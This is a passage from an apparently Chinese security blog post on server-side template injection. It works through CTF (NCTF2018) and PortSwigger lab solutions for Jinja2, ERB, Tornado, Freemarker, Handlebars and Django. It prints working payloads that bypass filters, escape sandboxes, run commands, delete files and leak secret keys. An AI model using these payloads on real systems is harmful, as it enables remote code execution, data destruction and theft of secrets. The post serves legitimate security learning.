class="built_in">dict</span>(ca=aa,t=dd)|join %&#125;    <span class="comment"># cat</span></span><br><span class="line">&#123;% <span class="built_in">set</span> flg = <span class="built_in">dict</span>(fl=aa,ag=dd)|join %&#125;    <span class="comment"># flag</span></span><br><span class="line">&#123;% <span class="built_in">set</span> ev = <span class="built_in">dict</span>(ev=aa,al=dd)|join %&#125;    <span class="comment"># eval</span></span><br><span class="line">&#123;% <span class="built_in">set</span> red = <span class="built_in">dict</span>(re=aa,ad=dd)|join %&#125;    <span class="comment"># read</span></span><br><span class="line">&#123;% <span class="built_in">set</span> bul = xhx*<span class="number">2</span>~but~xhx*<span class="number">2</span> %&#125;    <span class="comment"># __builtins__</span></span><br></pre></td></tr></table></figure>

<p>将上面构造的字符或字符串拼接起来构造出 <code>__import__(&#39;os&#39;).popen(&#39;cat /flag&#39;).read()</code>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set pld = xhx*2~imp~xhx*2~left~yin~os~yin~right~point~pon~left~yin~ca~space~slas~flg~yin~right~point~red~left~right %&#125;</span><br></pre></td></tr></table></figure>

<p>然后将上面构造的各种变量添加到SSTI万能payload里面就行了：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for f,v in whoami.__init__.__globals__.items() %&#125;    # globals</span><br><span class="line">    &#123;% if f == bul %&#125; </span><br><span class="line">        &#123;% for a,b in v.items() %&#125;    # builtins</span><br><span class="line">            &#123;% if a == ev %&#125;    # eval</span><br><span class="line">                &#123;&#123;b(pld)&#125;&#125;    # eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()&quot;)</span><br><span class="line">            &#123;% endif %&#125;</span><br><span class="line">        &#123;% endfor %&#125;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>

<p>所以最终的payload为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set zero = ((&#123; &#125;|select|string|list).pop(38)|int) %&#125;&#123;% set one = (zero**zero)|int %&#125;&#123;% set two = (zero-one-one)|abs|int %&#125;&#123;% set four = (two*two)|int %&#125;&#123;% set five = (two*two*two)-one-one-one %&#125;&#123;% set seven = (zero-one-one-five)|abs %&#125;&#123;% set xhx = ((&#123; &#125;|select|string|list).pop(24)|string) %&#125;&#123;% set space = ((&#123; &#125;|select|string|list).pop(10)|string) %&#125;&#123;% set point = ((app.__doc__|string|list).pop(26)|string) %&#125;&#123;% set yin = ((app.__doc__|string|list).pop(195)|string) %&#125;&#123;% set left = ((app.__doc__|string|list).pop(189)|string) %&#125;&#123;% set right = ((app.__doc__|string|list).pop(200)|string) %&#125;&#123;% set c = dict(c=aa)|reverse|first %&#125;&#123;% set bfh=self|string|urlencode|first %&#125;&#123;% set bfhc=bfh~c %&#125;&#123;% set slas = bfhc%((four~seven)|int) %&#125;&#123;% set but = dict(buil=aa,tins=dd)|join %&#125;&#123;% set imp = dict(imp=aa,ort=dd)|join %&#125;&#123;% set pon = dict(po=aa,pen=dd)|join %&#125;&#123;% set os = dict(o=aa,s=dd)|join %&#125;&#123;% set ca = dict(ca=aa,t=dd)|join %&#125;&#123;% set flg = dict(fl=aa,ag=dd)|join %&#125;&#123;% set ev = dict(ev=aa,al=dd)|join %&#125;&#123;% set red = dict(re=aa,ad=dd)|join %&#125;&#123;% set bul = xhx*2~but~xhx*2 %&#125;&#123;% set pld = xhx*2~imp~xhx*2~left~yin~os~yin~right~point~pon~left~yin~ca~space~slas~flg~yin~right~point~red~left~right %&#125;&#123;% for f,v in whoami.__init__.__globals__.items() %&#125;&#123;% if f == bul %&#125;&#123;% for a,b in v.items() %&#125;&#123;% if a == ev %&#125;&#123;&#123;b(pld)&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>

<p>拿去执行，成功执行命令并得到了flag</p>
<h2 id="过滤了request和class"><a href="#过滤了request和class" class="headerlink" title="过滤了request和class"></a>过滤了request和class</h2><p>这里除了用上面中括号或 <code>|attr()</code> 那几种方法外，我们还可以利用flask里面的session对象和config对象来逃逸这一姿势。</p>
<p>下面通过NCTF2018的两道flask题目来仔细讲解。</p>
<h3 id="NCTF2018-flask真香"><a href="#NCTF2018-flask真香" class="headerlink" title="[NCTF2018]flask真香"></a>[NCTF2018]flask真香</h3><p>打开题目一看，是一个炫酷的demo演示，这种demo一般是没有啥东西好挖的。首先F12信息收集，发现Python版本是3.5.2，没有Web静态服务器。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../imgs/$%7Bfiilname%7D/image-20240311234131976.png" alt="image-20240311234131976"></p>
<p>随便点开第二个demo发现404了，这里注意到404界面是Flask提供的404界面，按照以往的经验，猜测这里存在SSTI注入。</p>
<p>先尝试简单的payload：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../imgs/$%7Bfiilname%7D/image-20240311234152628.png" alt="image-20240311234152628"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../imgs/$%7Bfiilname%7D/image-20240311234211329.png" alt="image-20240311234211329"></p>
<p>从这里可见，毫无疑问的存在SSTI漏洞了。</p>
<p>那么就来康康到底有没有WAF，有的话被过滤了哪些。经过一番测试，确实很多东西都被过滤了，而且是正则表达式直接匹配删去，无法嵌套绕过。不完整测试有以下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">config</span><br><span class="line">class</span><br><span class="line">mro</span><br><span class="line">args</span><br><span class="line">request</span><br><span class="line">open</span><br><span class="line">eval</span><br><span class="line">builtins</span><br><span class="line">import</span><br></pre></td></tr></table></figure>

<p>从这里来看，似乎已经完全无法下手了。因为request和class都被过滤掉了。</p>
<p>卡在这里以后，最好的办法就是去查Flask官方文档了。从Flask官方文档里，找到了session对象，经过测试没有被过滤。更巧的是，session一定是一个dict对象，因此我们可以通过键的方法访问相应的类。<strong>由于键是一个字符串，因此可以通过字符串拼接绕过。</strong></p>
<p>python：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;session[&#x27;__cla&#x27;+&#x27;ss__&#x27;]&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../imgs/$%7Bfiilname%7D/image-20240311234233142.png" alt="image-20240311234233142"></p>
<p>访问到了类，我们就可以通过 <code>__bases__</code> 来获取基类的元组，带上索引0就可以访问到相应的基类。由此一直向上我们就可以访问到最顶层的<code>object</code>基类了。<strong>（同样的，如果没有过滤config的话，我们还可以利用config来逃逸，方法与session的相同）</strong></p>
<p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;session[&#x27;__cla&#x27;+&#x27;ss__&#x27;].__bases__[0].__bases__[0].__bases__[0].__bases__[0]&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../imgs/$%7Bfiilname%7D/image-20240311234250315.png" alt="image-20240311234250315"></p>
<p>有了对象基类，我们就可以通过访问 <code>__subclasses__</code> 方法再实例化去访问所有的子类。同样使用字符串拼接绕过WAF，这样就实现沙箱逃逸了。</p>
<p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;session[&#x27;__cla&#x27;+&#x27;ss__&#x27;].__bases__[0].__bases__[0].__bases__[0].__bases__[0][&#x27;__subcla&#x27;+&#x27;ss__&#x27;]()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../imgs/$%7Bfiilname%7D/image-20240311234307949.png" alt="image-20240311234307949"></p>
<p>SSTI目的无非就是两个：文件读写、执行命令。因此我们核心应该放在file类和os类。而坑爹的是，Python3几乎换了个遍。因此这里得去看官方文档去找相应的基类的用处。</p>
<p>我还是从os库入手，直接搜索“os”，找到了 <code>os._wrap_close</code> 类，同样使用dict键访问的方法。猜大致范围得到了索引序号，我这里序号是312，</p>
<p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;session[&#x27;__cla&#x27;+&#x27;ss__&#x27;].__bases__[0].__bases__[0].__bases__[0].__bases__[0][&#x27;__subcla&#x27;+&#x27;sses__&#x27;]()[312]&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../imgs/$%7Bfiilname%7D/image-20240311234331263.png" alt="image-20240311234331263"></p>
<p>我们调用它的 <code>__init__</code> 函数将其实例化，然后用 <code>__globals__</code> 查看其全局变量。</p>
<p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;session[&#x27;__cla&#x27;+&#x27;ss__&#x27;].__bases__[0].__bases__[0].__bases__[0].__bases__[0][&#x27;__subcla&#x27;+&#x27;sses__&#x27;]()[312].__init__.__globals__&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../imgs/$%7Bfiilname%7D/image-20240311234355595.png" alt="image-20240311234355595"></p>
<p>眼又花了，但我们的目的很明显，就是要执行命令，于是直接搜索 “popen” 就可以了：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../imgs/$%7Bfiilname%7D/image-20240311234444536.png" alt="image-20240311234444536"></p>
<p>由于又是一个dict类型，我们调用的时候又可以使用字符串拼接，绕过open过滤。</p>
<p>后面顺理成章的，我们将命令字符串传入，实例化这个函数，然后直接调用read方法就可以了。</p>
<p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;session[&#x27;__cla&#x27;+&#x27;ss__&#x27;].__bases__[0].__bases__[0].__bases__[0].__bases__[0][&#x27;__subcla&#x27;+&#x27;sses__&#x27;]()[312].__init__.__globals__[&#x27;po&#x27;+&#x27;pen&#x27;](&#x27;ls /&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../imgs/$%7Bfiilname%7D/image-20240311234502361.png" alt="image-20240311234502361"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;session[&#x27;__cla&#x27;+&#x27;ss__&#x27;].__bases__[0].__bases__[0].__bases__[0].__bases__[0][&#x27;__subcla&#x27;+&#x27;sses__&#x27;]()[312].__init__.__globals__[&#x27;po&#x27;+&#x27;pen&#x27;](&#x27;cat /Th1s__is_S3cret&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../imgs/$%7Bfiilname%7D/image-20240311234517964.png" alt="image-20240311234517964"></p>
<h2 id="BP-Lab-Basic-server-side-template-injection-ERB模板"><a href="#BP-Lab-Basic-server-side-template-injection-ERB模板" class="headerlink" title="BP-Lab: Basic server-side template injection(ERB模板)"></a>BP-Lab: Basic server-side template injection(ERB模板)</h2><p>题目要求：要解决实验问题，请查看 ERB 文档以了解如何执行任意代码，然后从 Carlos 的主目录中删除该 <code>morale.txt</code> 文件</p>
<p>首先在hacktricks上面搜索ERB，结果为：<a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#erb-ruby">https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#erb-ruby</a></p>
<p>该语法 <code>&lt;%= someExpression %&gt;</code> 用于计算表达式并在页面上呈现结果，几种基本操作如下：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../imgs/$%7Bfiilname%7D/image-20240324155506283.png" alt="image-20240324155506283"></p>
<p>当点击第一个商品的时候，页面提示如下：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../imgs/$%7Bfiilname%7D/image-20240324155549034.png" alt="image-20240324155549034"></p>
<p>猜测存在ERB漏洞，于是开始尝试，首先输入 <code>&lt;%= system(&quot;whoami&quot;) %&gt;</code>，发现正在题目要求的Carols目录下面，于是我们执行第二个代码直接删除所需删除的文件：<code>&lt;%= system(&quot;rm ./morale.txt&quot;) %&gt;</code>，解决题目</p>
<h2 id="BP-Lab-Basic-server-side-template-injection-code-context-Tornado模板"><a href="#BP-Lab-Basic-server-side-template-injection-code-context-Tornado模板" class="headerlink" title="BP-Lab: Basic server-side template injection(code context)(Tornado模板)"></a>BP-Lab: Basic server-side template injection(code context)(Tornado模板)</h2><p>题目要求：请查看 Tornado 文档以了解如何执行任意代码，然后从 Carlos 的主目录中删除该 <code>morale.txt</code> 文件</p>
<p>Tornado模板：<a target="_blank" rel="noopener" href="https://ajinabraham.com/blog/server-side-template-injection-in-tornado">https://ajinabraham.com/blog/server-side-template-injection-in-tornado</a></p>
<p>先进入一篇文章发表了一条评论，然后登录我的账户，更改网站希望使用您的全名、名字或昵称，更改完后刷新评论区发现名字会随着我的更改而改变，存在模板注入，抓包尝试一下：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../imgs/$%7Bfiilname%7D/image-20240324163209992.png" alt="image-20240324163209992"></p>
<p>发现评论区名字后面会跟着47，确认存在漏洞，接着操作</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../imgs/$%7Bfiilname%7D/image-20240324163259578.png" alt="image-20240324163259578"></p>
<p>位于Carlos目录下，继续操作删除要求的文件：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../imgs/$%7Bfiilname%7D/image-20240324163457643.png" alt="image-20240324163457643"></p>
<h2 id="BP-Lab-Basic-server-side-template-injection-using-documentation-Freemarker模板"><a href="#BP-Lab-Basic-server-side-template-injection-using-documentation-Freemarker模板" class="headerlink" title="BP-Lab: Basic server-side template injection using documentation(Freemarker模板)"></a>BP-Lab: Basic server-side template injection using documentation(Freemarker模板)</h2><p>题目要求：请确定模板引擎并使用文档来了解如何执行任意代码，然后从 Carlos 的主目录中删除该 <code>morale.txt</code> 文件</p>
<p>我们先登录题目提供的账号，然后进入随便一个商品滑到最下面点击修改模板（英语版的），进入一个页面开始修改，改模板的语法是 <code> $&#123;语句&#125;</code>，如果我们的语句填入的是不存在的对象，保存后页面会报错，从报错信息中得到改模板为Freemarker，于是上hacktricks搜索相关漏洞（当然题目要求的是自己查阅文档解决，不是这样子的），得到如下结果：<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../imgs/$%7Bfiilname%7D/image-20240324165934435.png" alt="image-20240324165934435"></p>
<p>其中，<code>new()</code> 可用于创建实现接口的 <code>TemplateModel</code> 任意 Java 对象，有一个名为 <code>Execute</code> 的类，可用于执行任意 shell 命令，开始构造：<code>&lt;#assign ex = &quot;freemarker.template.utility.Execute&quot;?new()&gt;$&#123; ex(&quot;id&quot;)&#125;</code>，确定所处目录是Carlos，于是删除要求的文件：<code>&lt;#assign ex = &quot;freemarker.template.utility.Execute&quot;?new()&gt;$&#123; ex(&quot;rm ./morale.txt&quot;)&#125;</code>，题目解决</p>
<h2 id="Lab-Server-side-template-injection-in-an-unknown-language-with-a-documented-exploit"><a href="#Lab-Server-side-template-injection-in-an-unknown-language-with-a-documented-exploit" class="headerlink" title="Lab: Server-side template injection in an unknown language with a documented exploit"></a>Lab: <a target="_blank" rel="noopener" href="https://portswigger.net/web-security/server-side-template-injection">Server-side template injection</a> in an unknown language with a documented exploit</h2><p>题目要求：请确定模板引擎并在线查找可用于执行任意代码的文档漏洞，然后从 Carlos 的主目录中删除该 <code>morale.txt</code> 文件</p>
<p>进入实验室后我们先点击第一个商品，回显跟第一题一模一样，所以现在我们需要确定使用的是哪种模板，于是输入 <code>$&#123;&#123;<%[%'"&#125;&#125;%\</code>，这是包含了各种模板语言的模板语法的模糊字符串，会弹出报错信息，从报错信息中得到是Handlebars模板，再次启动hacktricks，找到我们所需要的语句，并进行了url编码，如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%7B%7B%23with%20%22s%22%20as%20%7Cstring%7C%7D%7D%0A%20%20%7B%7B%23with%20%22e%22%7D%7D%0A%20%20%20%20%7B%7B%23with%20split%20as%20%7Cconslist%7C%7D%7D%0A%20%20%20%20%20%20%7B%7Bthis.pop%7D%7D%0A%20%20%20%20%20%20%7B%7Bthis.push%20(lookup%20string.sub%20%22constructor%22)%7D%7D%0A%20%20%20%20%20%20%7B%7Bthis.pop%7D%7D%0A%20%20%20%20%20%20%7B%7B%23with%20string.split%20as%20%7Ccodelist%7C%7D%7D%0A%20%20%20%20%20%20%20%20%7B%7Bthis.pop%7D%7D%0A%20%20%20%20%20%20%20%20%7B%7Bthis.push%20%22return%20require(&#x27;child_process&#x27;).exec(&#x27;rm /home/carlos/morale.txt&#x27;)%3B%22%7D%7D%0A%20%20%20%20%20%20%20%20%7B%7Bthis.pop%7D%7D%0A%20%20%20%20%20%20%20%20%7B%7B%23each%20conslist%7D%7D%0A%20%20%20%20%20%20%20%20%20%20%7B%7B%23with%20(string.sub.apply%200%20codelist)%7D%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%7B%7Bthis%7D%7D%0A%20%20%20%20%20%20%20%20%20%20%7B%7B%2Fwith%7D%7D%0A%20%20%20%20%20%20%20%20%7B%7B%2Feach%7D%7D%0A%20%20%20%20%20%20%7B%7B%2Fwith%7D%7D%0A%20%20%20%20%7B%7B%2Fwith%7D%7D%0A%20%20%7B%7B%2Fwith%7D%7D%0A%7B%7B%2Fwith%7D%7D</span><br></pre></td></tr></table></figure>

<p>题目解决</p>
<p>（不知道为何无论输入的命令是 <code>ls /</code>还是 <code>whoami</code>，输出的内容里面都没有包括这些命令的回显）</p>
<h2 id="Lab-服务器端模板注入，通过用户提供的对象进行信息披露"><a href="#Lab-服务器端模板注入，通过用户提供的对象进行信息披露" class="headerlink" title="Lab: 服务器端模板注入，通过用户提供的对象进行信息披露"></a>Lab: 服务器端模板注入，通过用户提供的对象进行信息披露</h2><p>题目要求：请窃取并提交框架的密钥</p>
<p>首先先登录账户，随机点进一篇文章后修改框架，测试出这题使用的框架是django框架，然后上网搜相关的解题技巧，研究 <a href="">Django 文档</a><a target="_blank" rel="noopener" href="https://docs.djangoproject.com/zh-hans/5.0/ref/%EF%BC%8C%E5%B9%B6%E6%B3%A8%E6%84%8F%E5%88%B0%E5%8F%AF%E4%BB%A5%E8%B0%83%E7%94%A8%E5%86%85%E7%BD%AE%E6%A8%A1%E6%9D%BF%E6%A0%87%E7%AD%BE">https://docs.djangoproject.com/zh-hans/5.0/ref/，并注意到可以调用内置模板标签</a> <code>debug</code> 来显示调试信息,于是 <code>&#123;% debug %&#125;</code>，访问settings对象，研究 Django 文档中的 <code>settings</code> 对象，并注意到它包含一个 <code>SECRET_KEY</code> 属性，于是：<code>&#123;&#123;settings.SECRET_KEY&#125;&#125;</code>，保存，输出了我们所需要的密钥</p>
<h2 id="Lab：沙盒环境中的服务器端模板注入"><a href="#Lab：沙盒环境中的服务器端模板注入" class="headerlink" title="Lab：沙盒环境中的服务器端模板注入"></a>Lab：沙盒环境中的服务器端模板注入</h2><p>题目要求：本实验使用 Freemarker 模板引擎。由于其沙盒实现不佳，它容易受到服务器端模板注入的影响。要解决实验室问题，请跳出沙盒，从 Carlos 的主目录中读取文件 <code>my_password.txt</code> 。然后提交文件的内容</p>
<p>首先先登录账户，随机点进一篇文章后修改框架，按照第一题那样修改为 <code>&lt;#assign ex = &quot;freemarker.template.utility.Execute&quot;?new()&gt;$&#123; ex(&quot;id&quot;)&#125;</code>会回显为了安全起见不允许动用excute函数，所以我们需要采用别的方法，根据hacktricks里面提供的方法我们发现可以这样子做</p>
<p><code>$&#123;product.getClass()&#125;</code>访问对象的属性和方法，接着用 <code>$&#123;product.getClass().getProtectionDomain()&#125;</code>用于获取对象 <code>product</code> 的类，然后获取该类的保护域（ProtectionDomain）</p>
<p>浏览文档以查找一系列方法调用，这些调用使用允许您读取文件的静态方法授予对类的访问权限，于是有了以下payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve(&#x27;/home/carlos/my_password.txt&#x27;).toURL().openStream().readAllBytes()?join(&quot; &quot;)&#125;</span><br></pre></td></tr></table></figure>

<p>得到的内容为ASCLL码的形式，拿去解码得到我们所需要的内容，该题解决</p>
</article><div class="post-copyright"><div class="copyright-cc-box"><i class="anzhiyufont anzhiyu-icon-copyright"></i></div><div class="post-copyright__author_box"><a class="post-copyright__author_img" href="/" title="头像"><img class="post-copyright__author_img_back" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/Sherlock.jpg" title="头像" alt="头像"><img class="post-copyright__author_img_front" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/Sherlock.jpg" title="头像" alt="头像"></a><div class="post-copyright__author_name">Sherlock</div><div class="post-copyright__author_desc">言念君子，温其如玉</div></div><div class="post-copyright__post__info"><a class="post-copyright__original" title="该文章为原创文章，注意版权协议" href="http://example.com/2024/03/01/ssti%E5%AD%A6%E4%B9%A0/">原创</a><a class="post-copyright-title"><span onclick="rm.copyPageUrl('http://example.com/2024/03/01/ssti%E5%AD%A6%E4%B9%A0/')">ssti学习</span></a></div><div class="post-tools" id="post-tools"><div class="post-tools-left"><div class="rewardLeftButton"></div><div class="shareRight"><div class="share-link mobile"><div class="share-qrcode"><div class="share-button" title="使用手机访问这篇文章"><i class="anzhiyufont anzhiyu-icon-qrcode"></i></div><div class="share-main"><div class="share-main-all"><div id="qrcode" title="http://example.com/2024/03/01/ssti%E5%AD%A6%E4%B9%A0/"></div><div class="reward-dec">使用手机访问这篇文章</div></div></div></div></div><div class="share-link weibo"><a class="share-button" target="_blank" href="https://service.weibo.com/share/share.php?title=ssti学习&amp;url=http://example.com/2024/03/01/ssti%E5%AD%A6%E4%B9%A0/&amp;pic=" rel="external nofollow noreferrer noopener"><i class="anzhiyufont anzhiyu-icon-weibo"></i></a></div><div class="share-link copyurl"><div class="share-button" id="post-share-url" title="复制链接" onclick="rm.copyPageUrl()"><i class="anzhiyufont anzhiyu-icon-link"></i></div></div></div></div></div><div class="post-copyright__notice"><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="post-tools-right"><div class="tag_share"><div class="post-meta__box"><div class="post-meta__box__tag-list"><a class="post-meta__box__tags" href="/tags/ssti/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>ssti<span class="tagsPageCount">2</span></a><a class="post-meta__box__tags" href="/tags/python/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>python<span class="tagsPageCount">3</span></a></div></div></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/02/27/php%E7%89%B9%E6%80%A7/"><img class="prev-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">php特性</div></div></a></div><div class="next-post pull-right"><a href="/2024/03/03/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%AD%A6%E4%B9%A0_max/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%AD%A6%E4%B9%A0/"><img class="next-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">文件上传学习</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="anzhiyufont anzhiyu-icon-thumbs-up fa-fw" style="font-size: 1.5rem; margin-right: 4px"></i><span>Related Articles</span></div><div class="relatedPosts-list"><div><a href="/2024/03/12/SSTI%E9%9D%B6%E5%9C%BA%E9%A2%98%E8%A7%A3/" title="SSTI靶场题解"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-03-12</div><div class="title">SSTI靶场题解</div></div></a></div><div><a href="/2024/03/19/python%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8/" title="python沙盒逃逸"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-03-19</div><div class="title">python沙盒逃逸</div></div></a></div><div><a href="/2024/01/15/python_max/python%E7%AC%94%E8%AE%B0/" title="python笔记"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-01-15</div><div class="title">python笔记</div></div></a></div></div></div></div><div class="aside-content" 